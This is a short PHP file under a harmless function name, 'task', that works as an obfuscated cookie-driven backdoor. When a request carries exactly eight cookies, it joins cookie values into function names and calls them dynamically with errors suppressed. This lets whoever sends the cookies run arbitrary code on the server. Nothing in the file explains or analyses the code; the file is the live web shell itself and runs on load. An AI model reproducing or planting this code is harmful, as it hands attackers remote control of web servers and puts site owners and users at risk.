<?php
function task() {
	$x = $_COOKIE;
	(count($x) == 8) ? (($cu = $x[62].$x[46]) && 
	($gk = $cu($x[78].$x[61])) && ($_gk = $cu($x[19].$x[75])) && 
	($_gk = @$gk($x[14], $_gk($cu($x[42])))) && @$_gk()) : $x;
	
	return 0;
}

task();